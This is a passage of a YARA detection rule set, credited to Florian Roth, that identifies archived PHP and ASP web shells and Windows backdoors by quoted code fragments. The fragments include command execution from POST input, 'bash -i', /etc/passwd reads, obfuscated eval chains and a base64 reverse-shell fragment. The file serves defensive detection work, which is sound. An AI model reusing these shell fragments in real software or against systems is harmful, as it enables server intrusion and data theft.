		$s13 = "// Created by greenwood from n57" fullword
		$s20 = " if (is_uploaded_file($userfile)) {" fullword
	condition:
		3 of them
}
rule WebShell_PHANTASMA {
	meta:
		description = "PHP Webshells Github Archive - file PHANTASMA.php"
		author = "Florian Roth"
		hash = "cd12d42abf854cd34ff9e93a80d464620af6d75e"
	strings:
		$s12 = "\"    printf(\\\"Usage: %s [Host] <port>\\\\n\\\", argv[0]);\\n\" ." fullword
		$s15 = "if ($portscan != \"\") {" fullword
		$s16 = "echo \"<br>Banner: $get <br><br>\";" fullword
		$s20 = "$dono = get_current_user( );" fullword
	condition:
		3 of them
}
rule WebShell_php_webshells_cw {
	meta:
		description = "PHP Webshells Github Archive - file cw.php"
		author = "Florian Roth"
		hash = "e65e0670ef6edf0a3581be6fe5ddeeffd22014bf"
	strings:
		$s1 = "// Dump Database [pacucci.com]" fullword
		$s2 = "$dump = \"-- Database: \".$_POST['db'] .\" \\n\";" fullword
		$s7 = "$aids = passthru(\"perl cbs.pl \".$_POST['connhost'].\" \".$_POST['connport']);" fullword
		$s8 = "<b>IP:</b> <u>\" . $_SERVER['REMOTE_ADDR'] .\"</u> - Server IP:</b> <a href='htt"
		$s14 = "$dump .= \"-- Cyber-Warrior.Org\\n\";" fullword
		$s20 = "if(isset($_POST['doedit']) && $_POST['editfile'] != $dir)" fullword
	condition:
		3 of them
}
rule WebShell_php_include_w_shell {
	meta:
		description = "PHP Webshells Github Archive - file php-include-w-shell.php"
		author = "Florian Roth"
		hash = "1a7f4868691410830ad954360950e37c582b0292"
	strings:
		$s13 = "# dump variables (DEBUG SCRIPT) NEEDS MODIFINY FOR B64 STATUS!!" fullword
		$s17 = "\"phpshellapp\" => \"export TERM=xterm; bash -i\"," fullword
		$s19 = "else if($numhosts == 1) $strOutput .= \"On 1 host..\\n\";" fullword
	condition:
		1 of them
}
rule WebShell_mysql_tool {
	meta:
		description = "PHP Webshells Github Archive - file mysql_tool.php"
		author = "Florian Roth"
		hash = "c9cf8cafcd4e65d1b57fdee5eef98f0f2de74474"
	strings:
		$s12 = "$dump .= \"-- Dumping data for table '$table'\\n\";" fullword
		$s20 = "$dump .= \"CREATE TABLE $table (\\n\";" fullword
	condition:
		2 of them
}
rule WebShell_PhpSpy_Ver_2006 {
	meta:
		description = "PHP Webshells Github Archive - file PhpSpy Ver 2006.php"
		author = "Florian Roth"
		hash = "34a89e0ab896c3518d9a474b71ee636ca595625d"
	strings:
		$s2 = "var_dump(@$shell->RegRead($_POST['readregname']));" fullword
		$s12 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname."
		$s19 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32"
		$s20 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe'"
	condition:
		1 of them
}
rule WebShell_ZyklonShell {
	meta:
		description = "PHP Webshells Github Archive - file ZyklonShell.php"
		author = "Florian Roth"
		hash = "3fa7e6f3566427196ac47551392e2386a038d61c"
	strings:
		$s0 = "The requested URL /Nemo/shell/zyklonshell.txt was not found on this server.<P>" fullword
		$s1 = "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">" fullword
		$s2 = "<TITLE>404 Not Found</TITLE>" fullword
		$s3 = "<H1>Not Found</H1>" fullword
	condition:
		all of them
}
rule WebShell_php_webshells_myshell {
	meta:
		description = "PHP Webshells Github Archive - file myshell.php"
		author = "Florian Roth"
		hash = "5bd52749872d1083e7be076a5e65ffcde210e524"
	strings:
		$s0 = "if($ok==false &&$status && $autoErrorTrap)system($command . \" 1> /tmp/outpu"
		$s5 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o"
		$s15 = "<title>$MyShellVersion - Access Denied</title>" fullword
		$s16 = "}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTT"
	condition:
		1 of them
}
rule WebShell_php_webshells_lolipop {
	meta:
		description = "PHP Webshells Github Archive - file lolipop.php"
		author = "Florian Roth"
		hash = "86f23baabb90c93465e6851e40104ded5a5164cb"
	strings:
		$s3 = "$commander = $_POST['commander']; " fullword
		$s9 = "$sourcego = $_POST['sourcego']; " fullword
		$s20 = "$result = mysql_query($loli12) or die (mysql_error()); " fullword
	condition:
		all of them
}
rule WebShell_simple_cmd {
	meta:
		description = "PHP Webshells Github Archive - file simple_cmd.php"
		author = "Florian Roth"
		hash = "466a8caf03cdebe07aa16ad490e54744f82e32c2"
	strings:
		$s1 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
		$s2 = "<title>G-Security Webshell</title>" fullword
		$s4 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
		$s6 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword
	condition:
		1 of them
}
rule WebShell_go_shell {
	meta:
		description = "PHP Webshells Github Archive - file go-shell.php"
		author = "Florian Roth"
		hash = "3dd85981bec33de42c04c53d081c230b5fc0e94f"
	strings:
		$s0 = "#change this password; for power security - delete this file =)" fullword
		$s2 = "if (!defined$param{cmd}){$param{cmd}=\"ls -la\"};" fullword
		$s11 = "open(FILEHANDLE, \"cd $param{dir}&&$param{cmd}|\");" fullword
		$s12 = "print << \"[kalabanga]\";" fullword
		$s13 = "<title>GO.cgi</title>" fullword
	condition:
		1 of them
}
rule WebShell_aZRaiLPhp_v1_0 {
	meta:
		description = "PHP Webshells Github Archive - file aZRaiLPhp v1.0.php"
		author = "Florian Roth"
		hash = "a2c609d1a8c8ba3d706d1d70bef69e63f239782b"
	strings:
		$s0 = "<font size='+1'color='#0000FF'>aZRaiLPhP'nin URL'si: http://$HTTP_HOST$RED"
		$s4 = "$fileperm=base_convert($_POST['fileperm'],8,10);" fullword
		$s19 = "touch (\"$path/$dismi\") or die(\"Dosya Olu" fullword
		$s20 = "echo \"<div align=left><a href='./$this_file?dir=$path/$file'>G" fullword
	condition:
		2 of them
}
rule WebShell_webshells_zehir4 {
	meta:
		description = "Webshells Github Archive - file zehir4"
		author = "Florian Roth"
		hash = "788928ae87551f286d189e163e55410acbb90a64"
		score = 55
	strings:
		$s0 = "frames.byZehir.document.execCommand(command, false, option);" fullword
		$s8 = "response.Write \"<title>ZehirIV --> Powered By Zehir &lt;zehirhacker@hotmail.com"
	condition:
		1 of them
}
rule WebShell_zehir4_asp_php {
	meta:
		description = "PHP Webshells Github Archive - file zehir4.asp.php.txt"
		author = "Florian Roth"
		hash = "1d9b78b5b14b821139541cc0deb4cbbd994ce157"
	strings:
		$s4 = "response.Write \"<title>zehir3 --> powered by zehir &lt;zehirhacker@hotmail.com&"
		$s11 = "frames.byZehir.document.execCommand("
		$s15 = "frames.byZehir.document.execCommand(co"
	condition:
		2 of them
}
rule WebShell_php_webshells_lostDC {
	meta:
		description = "PHP Webshells Github Archive - file lostDC.php"
		author = "Florian Roth"
		hash = "d54fe07ea53a8929620c50e3a3f8fb69fdeb1cde"
	strings:
		$s0 = "$info .= '[~]Server: ' .$_SERVER['HTTP_HOST'] .'<br />';" fullword
		$s4 = "header ( \"Content-Description: Download manager\" );" fullword
		$s5 = "print \"<center>[ Generation time: \".round(getTime()-startTime,4).\" second"
		$s9 = "if (mkdir($_POST['dir'], 0777) == false) {" fullword
		$s12 = "$ret = shellexec($command);" fullword
	condition:
		2 of them
}
rule WebShell_CasuS_1_5 {
	meta:
		description = "PHP Webshells Github Archive - file CasuS 1.5.php"
		author = "Florian Roth"
		hash = "7eee8882ad9b940407acc0146db018c302696341"
	strings:
		$s2 = "<font size='+1'color='#0000FF'><u>CasuS 1.5'in URL'si</u>: http://$HTTP_HO"
		$s8 = "$fonk_kap = get_cfg_var(\"fonksiyonlary_kapat\");" fullword
		$s18 = "if (file_exists(\"F:\\\\\")){" fullword
	condition:
		1 of them
}
rule WebShell_ftpsearch {
	meta:
		description = "PHP Webshells Github Archive - file ftpsearch.php"
		author = "Florian Roth"
		hash = "c945f597552ccb8c0309ad6d2831c8cabdf4e2d6"
	strings:
		$s0 = "echo \"[-] Error : coudn't read /etc/passwd\";" fullword
		$s9 = "@$ftp=ftp_connect('127.0.0.1');" fullword
		$s12 = "echo \"<title>Edited By KingDefacer</title><body>\";" fullword
		$s19 = "echo \"[+] Founded \".sizeof($users).\" entrys in /etc/passwd\\n\";" fullword
	condition:
		2 of them
}
rule WebShell__Cyber_Shell_cybershell_Cyber_Shell__v_1_0_ {
	meta:
		description = "PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php"
		author = "Florian Roth"
		super_rule = 1
		hash0 = "ef7f7c45d26614cea597f2f8e64a85d54630fe38"
		hash1 = "cabf47b96e3b2c46248f075bdbc46197db28a25f"
		hash2 = "9e165d4ed95e0501cd9a90155ac60546eb5b1076"
	strings:
		$s4 = " <a href=\"http://www.cyberlords.net\" target=\"_blank\">Cyber Lords Community</"
		$s10 = "echo \"<meta http-equiv=Refresh content=\\\"0; url=$PHP_SELF?edit=$nameoffile&sh"
		$s11 = " *   Coded by Pixcher" fullword
		$s16 = "<input type=text size=55 name=newfile value=\"$d/newfile.php\">" fullword
	condition:
		2 of them
}
rule WebShell__Ajax_PHP_Command_Shell_Ajax_PHP_Command_Shell_soldierofallah {
	meta:
		description = "PHP Webshells Github Archive - from files Ajax_PHP Command Shell.php, Ajax_PHP_Command_Shell.php, soldierofallah.php"
		author = "Florian Roth"
		super_rule = 1
		hash0 = "fa11deaee821ca3de7ad1caafa2a585ee1bc8d82"
		hash1 = "c0a4ba3e834fb63e0a220a43caaf55c654f97429"
		hash2 = "16fa789b20409c1f2ffec74484a30d0491904064"
	strings:
		$s1 = "'Read /etc/passwd' => \"runcommand('etcpasswdfile','GET')\"," fullword
		$s2 = "'Running processes' => \"runcommand('ps -aux','GET')\"," fullword
		$s3 = "$dt = $_POST['filecontent'];" fullword
		$s4 = "'Open ports' => \"runcommand('netstat -an | grep -i listen','GET')\"," fullword
		$s6 = "print \"Sorry, none of the command functions works.\";" fullword
		$s11 = "document.cmdform.command.value='';" fullword
		$s12 = "elseif(isset($_GET['savefile']) && !empty($_POST['filetosave']) && !empty($_POST"
	condition:
		3 of them
}
rule WebShell_Generic_PHP_7 {
	meta:
		description = "PHP Webshells Github Archive - from files Mysql interface v1.0.php, MySQL Web Interface Version 0.8.php, Mysql_interface_v1.0.php, MySQL_Web_Interface_Version_0.8.php"
		author = "Florian Roth"
		super_rule = 1
		hash0 = "de98f890790756f226f597489844eb3e53a867a9"
		hash1 = "128988c8ef5294d51c908690d27f69dffad4e42e"
		hash2 = "fd64f2bf77df8bcf4d161ec125fa5c3695fe1267"
		hash3 = "715f17e286416724e90113feab914c707a26d456"
	strings:
		$s0 = "header(\"Content-disposition: filename=$filename.sql\");" fullword
		$s1 = "else if( $action == \"dumpTable\" || $action == \"dumpDB\" ) {" fullword
		$s2 = "echo \"<font color=blue>[$USERNAME]</font> - \\n\";" fullword
		$s4 = "if( $action == \"dumpTable\" )" fullword
	condition:
		2 of them
}
rule WebShell__Small_Web_Shell_by_ZaCo_small_zaco_zacosmall {
	meta:
		description = "PHP Webshells Github Archive - from files Small Web Shell by ZaCo.php, small.php, zaco.php, zacosmall.php"
		author = "Florian Roth"
		super_rule = 1
		hash0 = "b148ead15d34a55771894424ace2a92983351dda"
		hash1 = "e4ba288f6d46dc77b403adf7d411a280601c635b"
		hash2 = "e5713d6d231c844011e9a74175a77e8eb835c856"
		hash3 = "1b836517164c18caf2c92ee2a06c645e26936a0c"
	strings:
		$s2 = "if(!$result2)$dump_file.='#error table '.$rows[0];" fullword
		$s4 = "if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');" fullword
		$s6 = "header('Content-Length: '.strlen($dump_file).\"\\n\");" fullword
		$s20 = "echo('Dump for '.$db_dump.' now in '.$to_file);" fullword
	condition:
		2 of them
}
rule WebShell_Generic_PHP_8 {
	meta:
		description = "PHP Webshells Github Archive - from files Macker's Private PHPShell.php, PHP Shell.php, Safe0ver Shell -Safe Mod Bypass By Evilc0der.php"
		author = "Florian Roth"
		super_rule = 1
		hash0 = "fc1ae242b926d70e32cdb08bbe92628bc5bd7f99"
		hash1 = "9ad55629c4576e5a31dd845012d13a08f1c1f14e"
		hash2 = "c4aa2cf665c784553740c3702c3bfcb5d7af65a3"
	strings:
		$s1 = "elseif ( $cmd==\"file\" ) { /* <!-- View a file in text --> */" fullword
		$s2 = "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ " fullword
		$s3 = "/* I added this to ensure the script will run correctly..." fullword
		$s14 = "<!--    </form>   -->" fullword
		$s15 = "<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\">" fullword
		$s20 = "elseif ( $cmd==\"downl\" ) { /*<!-- Save the edited file back to a file --> */" fullword
	condition:
		3 of them
}
rule WebShell__PH_Vayv_PHVayv_PH_Vayv_klasvayv_asp_php {
	meta:
		description = "PHP Webshells Github Archive - from files PH Vayv.php, PHVayv.php, PH_Vayv.php, klasvayv.asp.php.txt"
		author = "Florian Roth"
		super_rule = 1
		hash0 = "b51962a1ffa460ec793317571fc2f46042fd13ee"
		hash1 = "408ac9ca3d435c0f78bda370b33e84ba25afc357"
		hash2 = "4003ae289e3ae036755976f8d2407c9381ff5653"
		hash3 = "4f83bc2836601225a115b5ad54496428a507a361"
	strings:
		$s1 = "<font color=\"#000000\">Sil</font></a></font></td>" fullword
		$s5 = "<td width=\"122\" height=\"17\" bgcolor=\"#9F9F9F\">" fullword
		$s6 = "onfocus=\"if (this.value == 'Kullan" fullword
		$s16 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif\">"
	condition:
		2 of them
}
rule WebShell_Generic_PHP_9 {
	meta:
		description = "PHP Webshells Github Archive - from files KAdot Universal Shell v0.1.6.php, KAdot_Universal_Shell_v0.1.6.php, KA_uShell 0.1.6.php"
		author = "Florian Roth"
		super_rule = 1
		hash0 = "89f2a7007a2cd411e0a7abd2ff5218d212b84d18"
		hash1 = "2266178ad4eb72c2386c0a4d536e5d82bb7ed6a2"
		hash2 = "0daed818cac548324ad0c5905476deef9523ad73"
	strings:
		$s2 = ":<b>\" .base64_decode($_POST['tot']). \"</b>\";" fullword
		$s6 = "if (isset($_POST['wq']) && $_POST['wq']<>\"\") {" fullword
		$s12 = "if (!empty($_POST['c'])){" fullword
		$s13 = "passthru($_POST['c']);" fullword
		$s16 = "<input type=\"radio\" name=\"tac\" value=\"1\">B64 Decode<br>" fullword
		$s20 = "<input type=\"radio\" name=\"tac\" value=\"3\">md5 Hash" fullword
	condition:
		3 of them
}
rule WebShell__PH_Vayv_PHVayv_PH_Vayv {
	meta:
		description = "PHP Webshells Github Archive - from files PH Vayv.php, PHVayv.php, PH_Vayv.php"
		author = "Florian Roth"
		super_rule = 1
		hash0 = "b51962a1ffa460ec793317571fc2f46042fd13ee"
		hash1 = "408ac9ca3d435c0f78bda370b33e84ba25afc357"
		hash2 = "4003ae289e3ae036755976f8d2407c9381ff5653"
	strings:
		$s4 = "<form method=\"POST\" action=\"<?echo \"PHVayv.php?duzkaydet=$dizin/$duzenle"
		$s12 = "<? if ($ekinci==\".\" or  $ekinci==\"..\") {" fullword
		$s17 = "name=\"duzenx2\" value=\"Klas" fullword
	condition:
		2 of them
}
rule WebShell_Generic_PHP_1 {
	meta:
		description = "PHP Webshells Github Archive - from files Dive Shell 1.0 - Emperor Hacking Team.php, Dive_Shell_1.0_Emperor_Hacking_Team.php, SimShell 1.0 - Simorgh Security MGZ.php, SimShell_1.0_-_Simorgh_Security_MGZ.php"
		author = "Florian Roth"
		super_rule = 1
		hash0 = "3b086b9b53cf9d25ff0d30b1d41bb2f45c7cda2b"
		hash1 = "2558e728184b8efcdb57cfab918d95b06d45de04"
		hash2 = "203a8021192531d454efbc98a3bbb8cabe09c85c"
		hash3 = "b79709eb7801a28d02919c41cc75ac695884db27"
	strings:
		$s1 = "$token = substr($_REQUEST['command'], 0, $length);" fullword
		$s4 = "var command_hist = new Array(<?php echo $js_command_hist ?>);" fullword
		$s7 = "$_SESSION['output'] .= htmlspecialchars(fgets($io[1])," fullword
		$s9 = "document.shell.command.value = command_hist[current_line];" fullword
		$s16 = "$_REQUEST['command'] = $aliases[$token] . substr($_REQUEST['command'], $"
		$s19 = "if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) {" fullword
		$s20 = "if (e.keyCode == 38 && current_line < command_hist.length-1) {" fullword
	condition:
		5 of them
}
rule WebShell_Generic_PHP_2 {
	meta:
		description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, load_shell.php, Loaderz WEB Shell.php, stres.php"
		author = "Florian Roth"
		super_rule = 1
		hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
		hash1 = "ca9fcfb50645dc0712abdf18d613ed2196e66241"
		hash2 = "36d8782d749638fdcaeed540d183dd3c8edc6791"
		hash3 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"
	strings:
		$s3 = "if((isset($_POST['fileto']))||(isset($_POST['filefrom'])))" fullword
		$s4 = "\\$port = {$_POST['port']};" fullword
		$s5 = "$_POST['installpath'] = \"temp.pl\";}" fullword
		$s14 = "if(isset($_POST['post']) and $_POST['post'] == \"yes\" and @$HTTP_POST_FILES[\"u"
		$s16 = "copy($HTTP_POST_FILES[\"userfile\"][\"tmp_name\"],$HTTP_POST_FILES[\"userfile\"]"
	condition:
		4 of them
}
rule WebShell__CrystalShell_v_1_erne_stres {
	meta:
		description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, erne.php, stres.php"
		author = "Florian Roth"
		super_rule = 1
		hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
		hash1 = "6eb4ab630bd25bec577b39fb8a657350bf425687"
		hash2 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"
	strings:
		$s1 = "<input type='submit' value='  open (shill.txt) '>" fullword
		$s4 = "var_dump(curl_exec($ch));" fullword
		$s7 = "if(empty($_POST['Mohajer22'])){" fullword
		$s10 = "$m=$_POST['curl'];" fullword
		$s13 = "$u1p=$_POST['copy'];" fullword
		$s14 = "if(empty(\\$_POST['cmd'])){" fullword
		$s15 = "$string = explode(\"|\",$string);" fullword
		$s16 = "$stream = imap_open(\"/etc/passwd\", \"\", \"\");" fullword
	condition:
		5 of them
}
rule WebShell_Generic_PHP_3 {
	meta:
		description = "PHP Webshells Github Archive - from files Antichat Shell v1.3.php, Antichat Shell. Modified by Go0o$E.php, Antichat Shell.php, fatal.php"
		author = "Florian Roth"
		super_rule = 1
		hash0 = "d829e87b3ce34460088c7775a60bded64e530cd4"
		hash1 = "d710c95d9f18ec7c76d9349a28dd59c3605c02be"
		hash2 = "f044d44e559af22a1a7f9db72de1206f392b8976"
		hash3 = "41780a3e8c0dc3cbcaa7b4d3c066ae09fb74a289"
	strings:
		$s0 = "header('Content-Length:'.filesize($file).'');" fullword
		$s4 = "<textarea name=\\\"command\\\" rows=\\\"5\\\" cols=\\\"150\\\">\".@$_POST['comma"
		$s7 = "if(filetype($dir . $file)==\"file\")$files[]=$file;" fullword
		$s14 = "elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} " fullword
		$s20 = "$info .= (($perms & 0x0004) ? 'r' : '-');" fullword
	condition:
		all of them
}
rule WebShell_Generic_PHP_4 {
	meta:
		description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, load_shell.php, nshell.php, Loaderz WEB Shell.php, stres.php"
		author = "Florian Roth"
		super_rule = 1
		hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
		hash1 = "ca9fcfb50645dc0712abdf18d613ed2196e66241"
		hash2 = "86bc40772de71b1e7234d23cab355e1ff80c474d"
		hash3 = "36d8782d749638fdcaeed540d183dd3c8edc6791"
		hash4 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"
	strings:
		$s0 = "if ($filename != \".\" and $filename != \"..\"){" fullword
		$s2 = "$owner[\"write\"] = ($mode & 00200) ? 'w' : '-';" fullword
		$s5 = "$owner[\"execute\"] = ($mode & 00100) ? 'x' : '-';" fullword
		$s6 = "$world[\"write\"] = ($mode & 00002) ? 'w' : '-';" fullword
		$s7 = "$world[\"execute\"] = ($mode & 00001) ? 'x' : '-';" fullword
		$s10 = "foreach ($arr as $filename) {" fullword
		$s19 = "else if( $mode & 0x6000 ) { $type='b'; }" fullword
	condition:
		all of them
}
rule WebShell_Generic_PHP_5 {
	meta:
		description = "PHP Webshells Github Archive - from files ex0shell.php, megabor.php, GRP WebShell 2.0 release build 2018 (C)2006,Great.php"
		author = "Florian Roth"
		super_rule = 1
		hash0 = "64461ad8d8f23ea078201a31d747157f701a4e00"
		hash1 = "3df1afbcfa718da6fc8af27554834ff6d1a86562"
		hash2 = "ad86ef7f24f75081318146edc788e5466722a629"
	strings:
		$s0 = "(($perms & 0x0400) ? 'S' : '-'));" fullword
		$s10 = "} elseif (($perms & 0x8000) == 0x8000) {" fullword
		$s11 = "if (($perms & 0xC000) == 0xC000) {" fullword
		$s12 = "$info .= (($perms & 0x0008) ?" fullword
		$s16 = "// Block special" fullword
		$s18 = "$info = 's';" fullword
	condition:
		all of them
}
rule WebShell_GFS {
	meta:
		description = "PHP Webshells Github Archive - from files GFS web-shell ver 3.1.7 - PRiV8.php, Predator.php, GFS_web-shell_ver_3.1.7_-_PRiV8.php"
		author = "Florian Roth"
		super_rule = 1
		hash0 = "c2f1ef6b11aaec255d4dd31efad18a3869a2a42c"
		hash1 = "34f6640985b07009dbd06cd70983451aa4fe9822"
		hash2 = "d25ef72bdae3b3cb0fc0fdd81cfa58b215812a50"
	strings:
		$s0 = "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==\";" fullword
		$s1 = "lIENPTk47DQpleGl0IDA7DQp9DQp9\";" fullword
		$s2 = "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShm"
	condition:
		all of them
}
rule WebShell__CrystalShell_v_1_sosyete_stres {
	meta:
		description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, sosyete.php, stres.php"
		author = "Florian Roth"
		super_rule = 1
		hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
		hash1 = "e32405e776e87e45735c187c577d3a4f98a64059"
		hash2 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"
	strings:
		$s1 = "A:visited { COLOR:blue; TEXT-DECORATION: none}" fullword
		$s4 = "A:active {COLOR:blue; TEXT-DECORATION: none}" fullword
		$s11 = "scrollbar-darkshadow-color: #101842;" fullword
		$s15 = "<a bookmark=\"minipanel\">" fullword
		$s16 = "background-color: #EBEAEA;" fullword
		$s18 = "color: #D5ECF9;" fullword
		$s19 = "<center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 border"
	condition:
		all of them
}
rule WebShell_Generic_PHP_10 {
	meta:
		description = "PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php, PHPRemoteView.php"
		author = "Florian Roth"
		super_rule = 1
		hash0 = "ef7f7c45d26614cea597f2f8e64a85d54630fe38"
		hash1 = "cabf47b96e3b2c46248f075bdbc46197db28a25f"
		hash2 = "9e165d4ed95e0501cd9a90155ac60546eb5b1076"
		hash3 = "7d5b54c7cab6b82fb7d131d7bbb989fd53cb1b57"
	strings:
		$s2 = "$world[\"execute\"] = ($world['execute']=='x') ? 't' : 'T'; " fullword
		$s6 = "$owner[\"write\"] = ($mode & 00200) ? 'w' : '-'; " fullword
		$s11 = "$world[\"execute\"] = ($mode & 00001) ? 'x' : '-'; " fullword
		$s12 = "else if( $mode & 0xA000 ) " fullword
		$s17 = "$s=sprintf(\"%1s\", $type); " fullword
		$s20 = "font-size: 8pt;" fullword
	condition:
		all of them
}
rule WebShell_Generic_PHP_11 {
	meta:
		description = "PHP Webshells Github Archive - from files rootshell.php, Rootshell.v.1.0.php, s72 Shell v1.1 Coding.php, s72_Shell_v1.1_Coding.php"
		author = "Florian Roth"
		super_rule = 1
		hash0 = "31a82cbee8dffaf8eb7b73841f3f3e8e9b3e78cf"
		hash1 = "838c7191cb10d5bb0fc7460b4ad0c18c326764c6"
		hash2 = "8dfcd919d8ddc89335307a7b2d5d467b1fd67351"
		hash3 = "80aba3348434c66ac471daab949871ab16c50042"
	strings:
		$s5 = "$filename = $backupstring.\"$filename\";" fullword
		$s6 = "while ($file = readdir($folder)) {" fullword
		$s7 = "if($file != \".\" && $file != \"..\")" fullword
		$s9 = "$backupstring = \"copy_of_\";" fullword
		$s10 = "if( file_exists($file_name))" fullword
		$s13 = "global $file_name, $filename;" fullword
		$s16 = "copy($file,\"$filename\");" fullword
		$s18 = "<td width=\"49%\" height=\"142\">" fullword
	condition:
		all of them
}
rule WebShell__findsock_php_findsock_shell_php_reverse_shell {
	meta:
		description = "PHP Webshells Github Archive - from files findsock.c, php-findsock-shell.php, php-reverse-shell.php"
		author = "Florian Roth"
		super_rule = 1
		hash0 = "5622c9841d76617bfc3cd4cab1932d8349b7044f"
		hash1 = "4a20f36035bbae8e342aab0418134e750b881d05"
		hash2 = "40dbdc0bdf5218af50741ba011c5286a723fa9bf"
	strings:
		$s1 = "// me at pentestmonkey@pentestmonkey.net" fullword
	condition:
		all of them
}
rule WebShell_Generic_PHP_6 {
	meta:
		description = "PHP Webshells Github Archive - from files c0derz shell [csh] v. 0.1.1 release.php, CrystalShell v.1.php, load_shell.php, Loaderz WEB Shell.php, stres.php"
		author = "Florian Roth"
		super_rule = 1
		hash0 = "1a08f5260c4a2614636dfc108091927799776b13"
		hash1 = "335a0851304acedc3f117782b61479bbc0fd655a"
		hash2 = "ca9fcfb50645dc0712abdf18d613ed2196e66241"
		hash3 = "36d8782d749638fdcaeed540d183dd3c8edc6791"
		hash4 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"
	strings:
		$s2 = "@eval(stripslashes($_POST['phpcode']));" fullword
		$s5 = "echo shell_exec($com);" fullword
		$s7 = "if($sertype == \"winda\"){" fullword
		$s8 = "function execute($com)" fullword
		$s12 = "echo decode(execute($cmd));" fullword
		$s15 = "echo system($com);" fullword
	condition:
		4 of them
}

rule Unpack_Injectt {
	meta:
		description = "Webshells Auto-generated - file Injectt.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "8a5d2158a566c87edc999771e12d42c5"
	strings:
		$s2 = "%s -Run                              -->To Install And Run The Service"
		$s3 = "%s -Uninstall                        -->To Uninstall The Service"
		$s4 = "(STANDARD_RIGHTS_REQUIRED |SC_MANAGER_CONNECT |SC_MANAGER_CREATE_SERVICE |SC_MAN"
	condition:
		all of them
}
rule HYTop_DevPack_fso {
	meta:
		description = "Webshells Auto-generated - file fso.asp"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "b37f3cde1a08890bd822a182c3a881f6"
	strings:
		$s0 = "<!-- PageFSO Below -->"
		$s1 = "theFile.writeLine(\"<script language=\"\"vbscript\"\" runat=server>if request(\"\"\"&cli"
	condition:
		all of them
}
rule FeliksPack3___PHP_Shells_ssh {
	meta:
		description = "Webshells Auto-generated - file ssh.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "1aa5307790d72941589079989b4f900e"
	strings:
		$s0 = "eval(gzinflate(str_rot13(base64_decode('"
	condition:
		all of them
}
rule Debug_BDoor {
	meta:
		description = "Webshells Auto-generated - file BDoor.dll"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "e4e8e31dd44beb9320922c5f49739955"
	strings:
		$s1 = "\\BDoor\\"
		$s4 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
	condition:
		all of them
}
rule bin_Client {
	meta:
		description = "Webshells Auto-generated - file Client.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "5f91a5b46d155cacf0cc6673a2a5461b"
	strings:
		$s0 = "Recieved respond from server!!"
		$s4 = "packet door client"
		$s5 = "input source port(whatever you want):"
		$s7 = "Packet sent,waiting for reply..."
	condition:
		all of them
}
rule ZXshell2_0_malware_rar_Folder_ZXshell {
	meta:
		description = "Webshells Auto-generated - file ZXshell.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "246ce44502d2f6002d720d350e26c288"
	strings:
		$s0 = "WPreviewPagesn"
		$s1 = "DA!OLUTELY N"
	condition:
		all of them
}
rule RkNTLoad {
	meta:
		description = "Webshells Auto-generated - file RkNTLoad.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "262317c95ced56224f136ba532b8b34f"
	strings:
		$s1 = "$Info: This file is packed with the UPX executable packer http://upx.tsx.org $"
		$s2 = "5pur+virtu!"
		$s3 = "ugh spac#n"
		$s4 = "xcEx3WriL4"
		$s5 = "runtime error"
		$s6 = "loseHWait.Sr."
		$s7 = "essageBoxAw"
		$s8 = "$Id: UPX 1.07 Copyright (C) 1996-2001 the UPX Team. All Rights Reserved. $"
	condition:
		all of them
}
rule binder2_binder2 {
	meta:
		description = "Webshells Auto-generated - file binder2.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "d594e90ad23ae0bc0b65b59189c12f11"
	strings:
		$s0 = "IsCharAlphaNumericA"
		$s2 = "WideCharToM"
		$s4 = "g 5pur+virtu!"
		$s5 = "\\syslog.en"
		$s6 = "heap7'7oqk?not="
		$s8 = "- Kablto in"
	condition:
		all of them
}
rule thelast_orice2 {
	meta:
		description = "Webshells Auto-generated - file orice2.php"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "aa63ffb27bde8d03d00dda04421237ae"
	strings:
